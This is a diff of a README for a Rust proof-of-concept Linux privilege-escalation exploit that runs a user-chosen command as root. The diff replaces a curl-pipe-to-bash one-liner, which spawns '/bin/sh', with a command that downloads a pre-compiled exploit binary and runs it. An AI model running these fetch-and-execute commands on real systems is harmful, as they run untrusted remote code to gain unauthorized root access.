@@ -15,12 +15,7 @@ Based on the research and PoC by [Xint Code](https://xint.io/blog/copy-fail-linu
 - **Customizable**: Specify the command you want to run as root via CLI arguments.
 
 ## Quick Start (One-liner)
-You can run the PoC directly using the helper script:
-```bash
-curl -fsSL https://raw.githubusercontent.com/sammwyy/copyfail-rs/main/copyfail-rs.sh | bash -s -- "/bin/sh"
-```
-
-Or download the pre-compiled binary manually:
+You can download and run the pre-compiled PoC binary directly:
 ```bash
 curl -L https://github.com/sammwyy/copyfail-rs/releases/download/poc/copyfail-rs_x86-64 -o copyfail-rs && chmod +x copyfail-rs && ./copyfail-rs
 ```
